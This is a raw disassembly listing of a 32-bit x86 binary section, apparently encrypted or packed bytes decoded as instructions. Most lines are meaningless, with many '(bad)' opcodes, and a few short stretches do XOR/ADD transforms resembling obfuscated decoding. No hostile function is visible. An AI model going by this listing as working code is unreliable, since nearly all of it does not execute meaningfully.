  40ae14:	bound  ebx,QWORD PTR [ecx+0x25f920b3]
  40ae1a:	mov    cl,0x54
  40ae1c:	out    dx,eax
  40ae1d:	cld    
  40ae1e:	les    edx,FWORD PTR [ebx+esi*2]
  40ae21:	imul   esi,DWORD PTR [edx-0x21],0xf18f5fd8
  40ae28:	and    al,0x3
  40ae2a:	pop    ecx
  40ae2b:	xchg   ebp,eax
  40ae2c:	cmp    eax,0xbdfa41c3
  40ae31:	sub    BYTE PTR [esi],dh
  40ae33:	ins    DWORD PTR es:[edi],dx
  40ae34:	cdq    
  40ae35:	dec    DWORD PTR [ebx+0x4d9169a6]
  40ae3b:	dec    edx
  40ae3c:	mov    ah,0x38
  40ae3e:	cwde   
  40ae3f:	cwde   
  40ae40:	pop    ebx
  40ae41:	mov    ds:0x19531a69,eax
  40ae46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae47:	mov    al,ds:0xa1244915
  40ae4c:	iret   
  40ae4d:	xor    eax,0x702948a9
  40ae52:	ret    0x841e
  40ae55:	idiv   al
  40ae57:	ja     0x40aed3
  40ae59:	push   esp
  40ae5a:	push   ss
  40ae5b:	push   esp
  40ae5c:	cs dec eax
  40ae5e:	retf   0x8169
  40ae61:	ret    0xc6fa
  40ae64:	jb     0x40aea9
  40ae66:	iret   
  40ae67:	inc    ebp
  40ae68:	jns    0x40adfb
  40ae6a:	jo     0x40ae24
  40ae6c:	nop
  40ae6d:	repz mov dh,0x52
  40ae70:	ja     0x40adf5
  40ae72:	xor    BYTE PTR [esi-0x94de3e1],cl
  40ae78:	dec    ecx
  40ae79:	dec    esi
  40ae7a:	js     0x40aeed
  40ae7c:	cs adc eax,0x68af5f12
  40ae82:	(bad)  
  40ae83:	mov    ch,BYTE PTR [ebx+edx*1+0x19]
  40ae87:	push   edx
  40ae88:	(bad)  
  40ae89:	fisttp QWORD PTR [edi]
  40ae8b:	sbb    DWORD PTR [ebp+0x135eddd7],0xffffffef
  40ae92:	out    0xb8,eax
  40ae94:	jne    0x40ae93
  40ae96:	lods   al,BYTE PTR ds:[esi]
  40ae97:	pop    edx
  40ae98:	(bad)  
  40ae9a:	add    al,ch
  40ae9c:	cmp    BYTE PTR ds:0xb08bde4d,cl
  40aea2:	retf   
  40aea3:	ds mov cl,0x76
  40aea6:	ret    0x9250
  40aea9:	sub    eax,ebp
  40aeab:	nop
  40aeac:	test   BYTE PTR ds:0x26df22be,ch
  40aeb2:	es mov ch,0xaa
  40aeb5:	cld    
  40aeb6:	cmp    esp,DWORD PTR [esi+0x65]
  40aeb9:	pusha  
  40aeba:	cdq    
  40aebb:	mov    eax,ds:0xcd6eda69
  40aec0:	fisub  WORD PTR [edi-0x4c3c503]
  40aec6:	mov    cl,0x6a
  40aec8:	or     DWORD PTR [edx-0x47],ecx
  40aecb:	icebp  
  40aecc:	adc    BYTE PTR [ecx+esi*8+0x2b3a0511],dl
  40aed3:	not    bl
  40aed5:	stc    
  40aed6:	jge    0x40af39
  40aed8:	mov    ch,0x22
  40aeda:	inc    esi
  40aedb:	pmaddwd mm1,QWORD PTR [ebx-0xa9bea26]
  40aee2:	xlat   BYTE PTR ds:[ebx]
  40aee3:	lods   eax,DWORD PTR ds:[esi]
  40aee4:	jp     0x40af2b
  40aee6:	fsincos 
  40aee8:	mov    al,ds:0x98cb6e82
  40aeed:	loop   0x40af52
  40aeef:	push   es
  40aef0:	add    bh,dl
  40aef2:	popa   
  40aef3:	push   edi
  40aef4:	leave  
  40aef5:	push   0x4015334b
  40aefa:	mov    esp,0xf6551c8e
  40aeff:	push   es
  40af00:	xor    cl,ah
  40af02:	inc    esp
  40af03:	je     0x40ae9d
  40af05:	adc    DWORD PTR [edx+0x77],esi
  40af08:	xchg   cl,ah
  40af0a:	xchg   BYTE PTR [edx+0x130575c5],bh
  40af10:	inc    eax
  40af11:	jno    0x40aef9
  40af13:	mov    eax,0xc710874d
  40af18:	mov    bl,0x6
  40af1a:	mov    esp,0xe1cca96e
  40af1f:	sbb    cl,dh
  40af21:	lock nop
  40af23:	in     al,0x26
  40af25:	fnsave [edx-0x51]
  40af28:	xor    DWORD PTR [edi+0x613fe73f],ebx
  40af2e:	jno    0x40aeca
  40af30:	idiv   edx
  40af32:	(bad)  
  40af34:	sbb    esi,DWORD PTR [eax]
  40af36:	ret    0x27f4
  40af39:	pop    esp
  40af3a:	pop    edx
  40af3b:	adc    eax,0xb014f401
  40af40:	ss pusha 
  40af42:	xchg   edi,eax
  40af43:	rol    DWORD PTR [ecx-0x65],0x6f
  40af47:	call   0x61c8d949
  40af4c:	or     eax,0x5f098204
  40af51:	pop    ecx
  40af52:	lods   eax,DWORD PTR ss:[esi]
  40af54:	cmp    cl,BYTE PTR [edx]
  40af56:	out    0x60,eax
  40af58:	lds    esi,FWORD PTR [eax-0x6714e37d]
  40af5e:	pop    ecx
  40af5f:	shl    dh,cl
  40af61:	ror    DWORD PTR [edi-0x69992243],0xeb
  40af68:	(bad)  
  40af69:	adc    al,BYTE PTR [ebp+0x5f33d6c5]
  40af6f:	(bad)  
  40af70:	jge    0x40af94
  40af72:	mov    ebp,DWORD PTR [edi+0x55751467]
  40af78:	adc    ebp,DWORD PTR [eiz*1+0x44396d64]
  40af7f:	add    BYTE PTR [ebp-0x6b],al
  40af82:	jae    0x40af2f
  40af84:	idiv   DWORD PTR [eax+0x1d]
  40af87:	add    dh,bl
  40af89:	retf   0xd4e
  40af8c:	add    eax,0x784cad91
  40af91:	idiv   DWORD PTR ds:0x91545fc0
  40af97:	retf   0x58ec
  40af9a:	les    ecx,FWORD PTR [ecx-0x2]
  40af9d:	iret   
  40af9e:	int    0xc9
  40afa0:	push   esp
  40afa1:	popf   
  40afa2:	dec    esp
  40afa3:	imul   edx
  40afa5:	push   0xbbf77ab5
  40afaa:	pop    esi
  40afab:	xlat   BYTE PTR ds:[ebx]
  40afac:	add    cl,bl
  40afae:	adc    dh,BYTE PTR [esi]
  40afb0:	or     BYTE PTR [ecx],dl
  40afb2:	aaa    
  40afb3:	hlt    
  40afb4:	nop
  40afb5:	lock aam 0xd2
  40afb8:	sbb    DWORD PTR ds:0x1e45ab32,edx
  40afbe:	mov    ah,0x7d
  40afc0:	jne    0x40afbc
  40afc2:	jbe    0x40afa4
  40afc4:	add    eax,edi
  40afc6:	sbb    BYTE PTR [ebp+0x3e47fa36],bh
  40afcc:	push   esp
  40afcd:	aad    0x89
  40afcf:	pop    ebp
  40afd0:	hlt    
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     bh,BYTE PTR [ebx+ebx*8-0x17862a31]
  40affd:	jle    0x40b07d
  40afff:	cs jge 0x40b080
  40b002:	jle    0x40af98
  40b004:	bswap  edx
  40b006:	inc    ebx
  40b007:	xchg   ebx,eax
  40b008:	jb     0x40afd2
  40b00a:	faddp  st(7),st
  40b00c:	adc    edx,DWORD PTR [edx-0x7a7c4c7]
  40b012:	sar    BYTE PTR [edx+0x18c8acb8],cl
  40b018:	and    bh,BYTE PTR [edx]
  40b01a:	sahf   
  40b01b:	sar    BYTE PTR [ecx],0xdd
  40b01e:	pop    esi
  40b01f:	cmc    
  40b020:	push   cs
  40b021:	int    0xb1
  40b023:	ins    BYTE PTR es:[edi],dx
  40b024:	jmp    0xfadade94
  40b029:	push   ebx
  40b02a:	(bad)  
  40b02b:	fnstcw WORD PTR [edx+0x6b]
  40b02e:	rcr    BYTE PTR [edx-0x13575a00],1
  40b034:	es in  al,0xe7
  40b037:	fnstenv [ebp-0x6a2d21e4]
  40b03d:	pop    edx
  40b03e:	das    
  40b03f:	sub    dh,BYTE PTR [esi]
  40b041:	jg     0x40b002
  40b043:	mov    ebx,0x8703e523
  40b048:	scas   al,BYTE PTR es:[edi]
  40b049:	popf   
  40b04a:	repz pushf 
  40b04c:	jl     0x40b052
  40b04e:	cmc    
  40b04f:	mov    BYTE PTR [eax],bh
  40b051:	jl     0x40aff0
  40b053:	and    bl,BYTE PTR ds:0xa4a6225e
  40b059:	pusha  
  40b05a:	push   ecx
  40b05b:	cmc    
  40b05c:	push   edi
  40b05d:	add    DWORD PTR [eax+0xd],esp
  40b060:	leave  
  40b061:	push   cs
  40b062:	mov    WORD PTR [edx],ds
  40b064:	xor    DWORD PTR [esi+0x165eddcf],edx
  40b06a:	cli    
  40b06b:	leave  
  40b06c:	(bad)  
  40b06d:	mov    dh,0xa0
  40b06f:	or     BYTE PTR [ecx-0x501fdc43],dh
  40b075:	adc    ecx,DWORD PTR [ecx-0x1b]
  40b078:	sbb    DWORD PTR [ebp+0x53efb19c],0x12ab44a9
  40b082:	ror    DWORD PTR [edi],cl
  40b084:	inc    esp
  40b085:	call   0x4d7a:0x567e1a17
  40b08c:	xor    edi,DWORD PTR [ecx]
  40b08e:	inc    ebp
  40b08f:	push   ecx
  40b090:	mov    ch,dl
  40b092:	mov    BYTE PTR [ebp-0xe],dl
  40b095:	dec    ebp
  40b096:	push   ds
  40b097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b098:	loopne 0x40b083
  40b09a:	int3   
  40b09b:	in     al,dx
  40b09c:	xchg   ebx,eax
  40b09d:	in     eax,dx
  40b09e:	imul   esp,DWORD PTR [ecx],0x37
  40b0a1:	pop    ebx
  40b0a2:	lods   eax,DWORD PTR ds:[esi]
  40b0a3:	add    eax,0x531ac638
  40b0a8:	sbb    ebp,esi
  40b0aa:	std    
  40b0ab:	and    al,0x3f
  40b0ad:	(bad)  
  40b0ae:	jge    0x40b0f0
  40b0b0:	pop    ds
  40b0b1:	or     cl,BYTE PTR [edx+edx*8-0xb]
  40b0b5:	(bad)  
  40b0b6:	fcom   QWORD PTR [edi]
  40b0b8:	fidivr WORD PTR [ebp+0x4a6f101]
  40b0be:	lods   al,BYTE PTR ds:[esi]
  40b0bf:	jmp    0x82b7:0x10883431
  40b0c6:	push   edx
  40b0c7:	outs   dx,BYTE PTR ds:[esi]
  40b0c8:	push   0x2f073813
  40b0cd:	scas   eax,DWORD PTR es:[edi]
  40b0ce:	dec    esi
  40b0cf:	xor    ebx,ecx
  40b0d1:	ja     0x40b098
  40b0d3:	xlat   BYTE PTR ds:[ebx]
  40b0d4:	call   0xbd62ed8b
  40b0d9:	inc    eax
  40b0da:	inc    eax
  40b0db:	iret   
  40b0dc:	push   eax
  40b0dd:	iret   
  40b0de:	push   ecx
  40b0df:	pop    ecx
  40b0e0:	mov    BYTE PTR [ebx+0x711408a],bl
  40b0e6:	sub    DWORD PTR [ecx-0x529cbfbb],esp
  40b0ec:	in     eax,dx
  40b0ed:	mov    al,ds:0x89a31ff7
  40b0f2:	inc    edi
  40b0f3:	inc    ecx
  40b0f4:	fcomp  QWORD PTR [eax]
  40b0f6:	xor    edx,esp
  40b0f8:	aas    
  40b0f9:	ret    
  40b0fa:	imul   esp
  40b0fc:	pop    ebp
  40b0fd:	stc    
  40b0fe:	cmp    BYTE PTR [edx],bh
  40b100:	mov    edi,0x37b732fa
  40b105:	adc    eax,0xb1160e0e
  40b10a:	or     DWORD PTR [edx],ebp
  40b10c:	pusha  
  40b10d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b10e:	sub    ebx,DWORD PTR ss:[edi]
  40b111:	cdq    
  40b112:	mov    ecx,0x67cd9db4
  40b117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b118:	inc    esi
  40b119:	push   esp
  40b11a:	mov    esi,0x4bc473c
  40b11f:	adc    DWORD PTR [esi+0xaa6f737],0xffffff98
  40b126:	(bad)  
  40b127:	hlt    
  40b128:	and    esp,DWORD PTR [edi+0x6f]
  40b12b:	out    0xa0,al
  40b12d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b12e:	add    DWORD PTR ds:0x58fb8cd6,edx
  40b134:	cli    
  40b135:	shr    bl,0x96
  40b138:	or     ah,dh
  40b13a:	jo     0x40b12e
  40b13c:	pop    ebx
  40b13d:	or     al,0x42
  40b13f:	stos   DWORD PTR es:[edi],eax
  40b140:	out    dx,al
  40b141:	pop    ecx
  40b142:	xchg   esi,eax
  40b143:	aam    0x40
  40b145:	sti    
  40b146:	pop    esp
  40b147:	js     0x40b1b9
  40b149:	std    
  40b14a:	repz xchg esp,eax
  40b14c:	adc    eax,0xd6482146
  40b151:	fwait
  40b152:	pop    DWORD PTR [edi-0x5f]
  40b155:	das    
  40b156:	(bad)  
  40b157:	xor    al,0xfc
  40b159:	pop    ebx
  40b15a:	cmp    al,BYTE PTR [ebx]
  40b15c:	call   0x12e373ce
  40b161:	xchg   ebx,eax
  40b162:	lahf   
  40b163:	retf   
  40b164:	pop    bp
  40b166:	add    BYTE PTR [edx+0x46],0x32
  40b16a:	daa    
  40b16b:	cld    
  40b16c:	jne    0x40b107
  40b16e:	ins    BYTE PTR es:[edi],dx
  40b16f:	push   eax
  40b170:	retf   
  40b171:	mov    bh,0xeb
  40b173:	push   ds
  40b174:	cdq    
  40b175:	mov    BYTE PTR [ecx-0x30],al
  40b178:	sbb    dh,BYTE PTR [eax-0x49]
  40b17b:	dec    ebx
  40b17c:	ds ret 
  40b17e:	mov    eax,0x34f169bb
  40b183:	add    BYTE PTR [edi+0x2d],bh
  40b186:	push   ecx
  40b187:	aas    
  40b188:	loop   0x40b16f
  40b18a:	push   0x14
  40b18c:	cmp    bh,al
  40b18e:	popf   
  40b18f:	cli    
  40b190:	jb     0x40b137
  40b192:	out    dx,eax
  40b193:	lea    ebx,[esi+0x6f]
  40b196:	push   eax
  40b197:	add    DWORD PTR [ebx-0x5932d16a],esp
  40b19d:	adc    DWORD PTR [edx+ebx*8-0x6e827ad5],ecx
  40b1a4:	sbb    al,dh
  40b1a6:	popa   
  40b1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a8:	xchg   esi,eax
  40b1a9:	lods   al,BYTE PTR ds:[esi]
  40b1aa:	jnp    0x40b1f6
  40b1ac:	out    0x80,al
  40b1ae:	inc    esp
  40b1af:	push   cs
  40b1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b1:	dec    ecx
  40b1b2:	pop    ecx
  40b1b3:	mov    eax,0xe318077a
  40b1b8:	lahf   
  40b1b9:	sbb    bh,BYTE PTR [esi]
  40b1bb:	and    ch,BYTE PTR [esi-0x56ee323]
  40b1c1:	retf   0xe6ce
  40b1c4:	xor    al,BYTE PTR [esi-0x55a514eb]
  40b1ca:	pop    eax
  40b1cb:	fwait
  40b1cc:	cmp    ecx,edi
  40b1ce:	out    dx,eax
  40b1cf:	ins    BYTE PTR es:[edi],dx
  40b1d0:	lods   al,BYTE PTR ds:[esi]
  40b1d1:	add    ch,BYTE PTR ds:0x6628d1f
  40b1d7:	or     DWORD PTR [esi+eax*2],0x644e058a
  40b1de:	addr16 lahf 
  40b1e0:	ins    BYTE PTR es:[edi],dx
  40b1e1:	leave  
  40b1e2:	mov    ah,ah
  40b1e4:	in     al,dx
  40b1e5:	add    ebx,esi
  40b1e7:	lods   al,BYTE PTR ds:[esi]
  40b1e8:	int    0xfb
  40b1ea:	adc    edi,edx
  40b1ec:	lods   al,BYTE PTR ds:[esi]
  40b1ed:	retf   0x6056
  40b1f0:	loope  0x40b25e
  40b1f2:	fs pop esp
  40b1f4:	adc    edi,edx
  40b1f6:	int3   
  40b1f7:	or     esp,DWORD PTR [edx-0x37]
  40b1fa:	shl    BYTE PTR [ecx-0x57],cl
  40b1fd:	dec    ebx
  40b1fe:	cmp    dh,BYTE PTR ds:0xb65c4ae8
  40b204:	mov    ebp,0x77dfa640
  40b209:	aam    0x16
  40b20b:	ret    0xf82
  40b20e:	xor    al,0xe8
  40b210:	cmp    bl,dh
  40b212:	test   DWORD PTR [ecx+0x6d],0x9a924899
  40b219:	mov    bh,0x6c
  40b21b:	mov    esp,0x308039cd
  40b220:	mov    ds:0x4e0dd848,eax
  40b225:	jmp    0x20fbb93c
  40b22a:	cwde   
  40b22b:	not    BYTE PTR ds:0xdfebe153
  40b231:	add    DWORD PTR [ecx],edx
  40b233:	adc    eax,0xa7aa80b4
  40b238:	xchg   ebx,eax
  40b239:	lahf   
  40b23a:	outs   dx,BYTE PTR ds:[esi]
  40b23b:	sbb    eax,0xf3d5ef3d
  40b240:	xchg   DWORD PTR [ecx+0x756d42d0],ebp
  40b246:	xor    BYTE PTR [edi+0x20],cl
  40b249:	mov    bh,bl
  40b24b:	test   BYTE PTR [esi+edx*8+0x53f3d57d],ah
  40b252:	xor    cl,BYTE PTR [ebx+ecx*2]
  40b255:	mov    ds:0x3aeb5664,eax
  40b25a:	(bad)  
  40b25c:	enter  0x75d9,0x9c
  40b260:	or     DWORD PTR [ecx],ebx
  40b262:	inc    edi
  40b263:	mov    ecx,0xec184f6e
  40b268:	dec    edx
  40b269:	test   edx,ebp
  40b26b:	push   esi
  40b26c:	jno    0x40b27a
  40b26e:	clc    
  40b26f:	cmp    al,0x5b
  40b271:	xor    DWORD PTR [esi-0x40],eax
  40b274:	pushf  
  40b275:	fwait
  40b276:	sbb    eax,0x56c03bc6
  40b27b:	pop    DWORD PTR [edi]
  40b27d:	hlt    
  40b27e:	mov    bl,dl
  40b280:	sbb    dl,BYTE PTR [eax]
  40b282:	sub    al,BYTE PTR [ebp+ecx*1+0x7d]
  40b286:	sbb    ch,bh
  40b288:	pop    esi
  40b289:	xchg   edi,eax
  40b28a:	pop    ds
  40b28b:	and    ah,bh
  40b28d:	cmp    BYTE PTR [eax-0x772532da],0x17
  40b294:	sbb    esi,DWORD PTR [ebx]
  40b296:	das    
  40b297:	xchg   BYTE PTR [ecx+0x1ec283f7],ah
  40b29d:	pop    edi
  40b29e:	lea    esi,[edi]
  40b2a0:	dec    ebx
  40b2a1:	mov    ds:0x14db44ee,eax
  40b2a6:	repz pop ds
  40b2a8:	(bad)  
  40b2a9:	(bad)  
  40b2aa:	hlt    
  40b2ab:	aas    
  40b2ac:	pop    ecx
  40b2ad:	or     BYTE PTR [ecx-0x7073e249],bl
  40b2b3:	sbb    bl,bl
  40b2b5:	idiv   DWORD PTR [ebx]
  40b2b7:	push   es
  40b2b8:	push   cs
  40b2b9:	pop    ss
  40b2ba:	lods   eax,DWORD PTR ds:[esi]
  40b2bb:	push   cs
  40b2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2bd:	clc    
  40b2be:	dec    ebx
  40b2bf:	dec    esi
  40b2c0:	push   edx
  40b2c1:	sahf   
  40b2c2:	(bad)  
  40b2c4:	in     eax,0x41
  40b2c6:	lea    esi,ds:0x46d8f972
  40b2cc:	test   eax,0x81ed5454
  40b2d1:	pop    ds
  40b2d2:	mov    dl,0x92
  40b2d4:	aaa    
  40b2d5:	mov    WORD PTR [edi+0x4074e2a2],?
  40b2db:	inc    ecx
  40b2dc:	mov    eax,ds:0x47a43a4d
  40b2e1:	push   esi
  40b2e2:	in     eax,0xb4
  40b2e4:	mov    ebp,0xdea00c83
  40b2e9:	xor    BYTE PTR [edx-0x52],dh
  40b2ec:	or     edx,edi
  40b2ee:	mov    bl,0x11
  40b2f0:	mov    edi,0x2b505fdb
  40b2f5:	pop    ebx
  40b2f6:	nop
  40b2f7:	int3   
  40b2f8:	lea    esp,[ebx+eax*4+0x4842ecfb]
  40b2ff:	(bad)  
  40b300:	nop
  40b301:	cli    
  40b302:	or     BYTE PTR [esi],ah
  40b304:	jmp    0x40b32d
  40b306:	dec    edx
  40b307:	mov    bh,0xdc
  40b309:	dec    esi
  40b30a:	xor    al,0x50
  40b30c:	cmp    DWORD PTR ds:0x4494814f,eax
  40b312:	and    cl,BYTE PTR [edx+0x5cb2b5d5]
  40b318:	dec    ebx
  40b319:	inc    ecx
  40b31a:	std    
  40b31b:	hlt    
  40b31c:	sub    DWORD PTR [edx],esp
  40b31e:	push   esp
  40b31f:	inc    ebx
  40b320:	daa    
  40b321:	xor    edx,esp
  40b323:	sbb    BYTE PTR [esi],0xa3
  40b326:	popa   
  40b327:	das    
  40b328:	call   0xde69:0xa7b028d6
  40b32f:	fcomp  DWORD PTR [eax+0x17]
  40b332:	bound  ecx,QWORD PTR [ebx+0x4d8b0845]
  40b338:	clc    
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	jo     0x40b31e
  40b376:	pop    esi
  40b377:	push   ecx
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b3c1
  40b381:	fs inc ebx
  40b383:	adc    edx,esi
  40b385:	jecxz  0x40b3d4
  40b387:	inc    ecx
  40b388:	cli    
  40b389:	push   eax
  40b38a:	mov    DWORD PTR [ebp+0x160d67d4],ecx
  40b390:	aaa    
  40b391:	xchg   ecx,eax
  40b392:	jp     0x40b399
  40b394:	lock popa 
  40b396:	out    dx,eax
  40b397:	push   0x4a
  40b399:	outs   dx,BYTE PTR ds:[esi]
  40b39a:	jno    0x40b3c5
  40b39c:	ret    
  40b39d:	outs   dx,DWORD PTR fs:[esi]
  40b39f:	adc    DWORD PTR [edx],edx
  40b3a1:	cdq    
  40b3a2:	es fcmovnb st,st(6)
  40b3a5:	imul   edi,edi,0xffffffb6
  40b3a8:	call   0x9aaa:0xc55937d7
  40b3af:	ins    BYTE PTR es:[edi],dx
  40b3b0:	mov    ?,WORD PTR [edx+0x79]
  40b3b3:	pop    ss
  40b3b4:	out    dx,al
  40b3b5:	mov    ebx,?
  40b3b7:	dec    ecx
  40b3b8:	outs   dx,BYTE PTR ds:[esi]
  40b3b9:	cs cdq 
  40b3bb:	test   DWORD PTR ds:0x75e38991,ebp
  40b3c1:	inc    esp
  40b3c2:	inc    ebx
  40b3c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3c4:	jne    0x40b396
  40b3c6:	rol    DWORD PTR [esi],0x5
  40b3c9:	(bad)  
  40b3ca:	sbb    BYTE PTR es:[ebx-0x48ca9534],dh
  40b3d1:	scas   eax,DWORD PTR es:[edi]
  40b3d2:	or     dl,BYTE PTR [ebp+0x4c]
  40b3d5:	(bad)  
  40b3d6:	mov    al,0x50
  40b3d8:	jle    0x40b369
  40b3da:	fiadd  DWORD PTR [ebx]
  40b3dc:	retf   0x7949
  40b3df:	dec    eax
  40b3e0:	lods   eax,DWORD PTR cs:[esi]
  40b3e2:	in     eax,dx
  40b3e3:	fs retf 
  40b3e5:	repnz xchg esp,eax
  40b3e7:	pushf  
  40b3e8:	cmp    BYTE PTR [ebx+0x54],dl
  40b3eb:	mov    edx,0x5c0eeeb7
  40b3f0:	stc    
  40b3f1:	sbb    al,0x20
  40b3f3:	pusha  
  40b3f4:	mov    eax,ds:0xf068c1b9
  40b3f9:	pop    esp
  40b3fa:	stc    
  40b3fb:	stos   DWORD PTR es:[edi],eax
  40b3fc:	nop
  40b3fd:	mov    cl,0x8a
  40b3ff:	sub    eax,0xda5d15a0
  40b404:	cmp    DWORD PTR [esi+0x684bd629],eax
  40b40a:	mov    DWORD PTR [ebx+0x64],ecx
  40b40d:	aaa    
  40b40e:	fbstp  TBYTE PTR [ebx+0x7]
  40b411:	je     0x40b430
  40b413:	add    al,0x72
  40b415:	push   0xffffffff
  40b417:	push   eax
  40b418:	jg     0x40b44c
  40b41a:	shr    al,cl
  40b41c:	mov    ebx,0x34b604ef
  40b421:	ror    DWORD PTR [edi+0x68],cl
  40b424:	dec    edx
  40b425:	mov    dl,BYTE PTR [esi]
  40b427:	mov    al,ds:0xa82338b2
  40b42c:	add    al,0x7e
  40b42e:	jo     0x40b3d1
  40b430:	cmp    cl,0x1d
  40b433:	mov    bl,0x91
  40b435:	lods   al,BYTE PTR ds:[esi]
  40b436:	add    eax,0xc16d60a3
  40b43b:	test   eax,0xc56ebf77
  40b440:	je     0x40b439
  40b442:	mov    ah,0x16
  40b444:	dec    edi
  40b445:	and    al,ch
  40b447:	sub    DWORD PTR [eax+0x2639e250],0xe
  40b44e:	ins    DWORD PTR es:[edi],dx
  40b44f:	xchg   esp,eax
  40b450:	test   eax,0x23682288
  40b455:	jno    0x40b4b3
  40b457:	(bad)  
  40b458:	pop    ebx
  40b459:	ja     0x40b4a8
  40b45b:	and    eax,0xa1e62451
  40b460:	pop    es
  40b461:	pop    edx
  40b462:	jnp    0x40b42a
  40b464:	fnstcw WORD PTR [edx]
  40b466:	xchg   edx,eax
  40b467:	xchg   esi,eax
  40b468:	jbe    0x40b41d
  40b46a:	add    bh,bl
  40b46c:	lea    esi,[ecx+ecx*4+0x7a866ac9]
  40b473:	xchg   ebx,eax
  40b474:	xchg   ebx,eax
  40b475:	fcom   QWORD PTR [ebp+0x1c]
  40b478:	jmp    0x616d:0x7a9d1a91
  40b47f:	cmp    DWORD PTR [esi+0x77bed88e],ecx
  40b485:	mov    al,ds:0x8c18b091
  40b48a:	loope  0x40b46c
  40b48c:	fwait
  40b48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b48e:	xchg   bh,dh
  40b490:	pop    ecx
  40b491:	out    dx,al
  40b492:	and    al,0x15
  40b494:	jl     0x40b510
  40b496:	mov    bh,0x1d
  40b498:	pop    edi
  40b499:	fmul   DWORD PTR [eax+edi*4-0x66]
  40b49d:	xchg   edi,esi
  40b49f:	pop    edx
  40b4a0:	push   eax
  40b4a1:	lods   eax,DWORD PTR ds:[esi]
  40b4a2:	lea    ecx,[ebx]
  40b4a4:	popa   
  40b4a5:	or     esi,DWORD PTR [ecx+ebp*8-0x6bfaa119]
  40b4ac:	inc    edi
  40b4ad:	retf   
  40b4ae:	popa   
  40b4af:	mov    cl,0xc3
  40b4b1:	mov    al,0x61
  40b4b3:	push   ebp
  40b4b4:	mov    al,ds:0x3db51da3
  40b4b9:	(bad)  
  40b4ba:	fld    QWORD PTR [ebx+0x5c]
  40b4bd:	sub    al,0xc7
  40b4bf:	mov    ?,WORD PTR [eax-0x2583bcbc]
  40b4c5:	movd   DWORD PTR ds:[eax+0x4b48b692],mm5
  40b4cd:	pop    ds
  40b4ce:	dec    ecx
  40b4cf:	mov    eax,ds:0x732985e0
  40b4d4:	adc    eax,0x5a8275c9
  40b4d9:	fcomi  st,st(6)
  40b4db:	(bad)  
  40b4dc:	call   0x8728021b
  40b4e1:	fidivr DWORD PTR [esi+0x53]
  40b4e4:	cli    
  40b4e5:	fwait
  40b4e6:	adc    ah,BYTE PTR [ecx+0x3316520e]
  40b4ec:	retf   
  40b4ed:	mov    eax,ds:0xcbf000fe
  40b4f2:	imul   ebp,DWORD PTR [ebx-0x5e],0x5f61575c
  40b4f9:	pop    esi
  40b4fa:	mov    BYTE PTR [esi+0x72f34322],ah
  40b500:	mov    WORD PTR [ecx-0x50],ds
  40b503:	out    0x5,al
  40b505:	or     BYTE PTR [esi],ah
  40b507:	(bad)  
  40b508:	sbb    al,0x83
  40b50a:	mov    esi,0xd760762b
  40b50f:	dec    esp
  40b510:	mov    gs,WORD PTR [esi+0x6a05ae2c]
  40b516:	shl    DWORD PTR [edx-0x5cdf3bec],1
  40b51c:	dec    esi
  40b51d:	fistp  DWORD PTR [ebx]
  40b51f:	loope  0x40b524
  40b521:	adc    esi,DWORD PTR [esi-0x47]
  40b524:	inc    ebp
  40b525:	outs   dx,DWORD PTR ds:[esi]
  40b526:	or     bl,bh
  40b528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b529:	(bad)  
  40b52a:	push   esp
  40b52b:	fistp  WORD PTR [ebx+0x6b]
  40b52e:	lea    edx,[esi]
  40b530:	mov    BYTE PTR [edi-0x424115f6],dl
  40b536:	scas   al,BYTE PTR es:[edi]
  40b537:	xchg   dh,ah
  40b539:	(bad)  
  40b53a:	hlt    
  40b53b:	aam    0xa6
  40b53d:	retf   0x7505
  40b540:	pop    ecx
  40b541:	jnp    0x40b4e0
  40b543:	fs nop
  40b545:	dec    esp
  40b546:	fldenv [eax-0x7e2c3bec]
  40b54c:	jmp    0x40b5a6
  40b54e:	neg    edi
  40b550:	aaa    
  40b551:	outs   dx,DWORD PTR ds:[esi]
  40b552:	and    esp,DWORD PTR [edi]
  40b554:	lods   eax,DWORD PTR ds:[esi]
  40b555:	mov    bl,BYTE PTR [ebx-0x7f]
  40b558:	mov    BYTE PTR ds:0x2a72de7f,dh
  40b55e:	or     eax,0xa848560f
  40b563:	pop    ds
  40b564:	sbb    ebx,DWORD PTR [eax]
  40b566:	(bad)  
  40b567:	jnp    0x40b5c8
  40b569:	inc    ebp
  40b56a:	dec    ecx
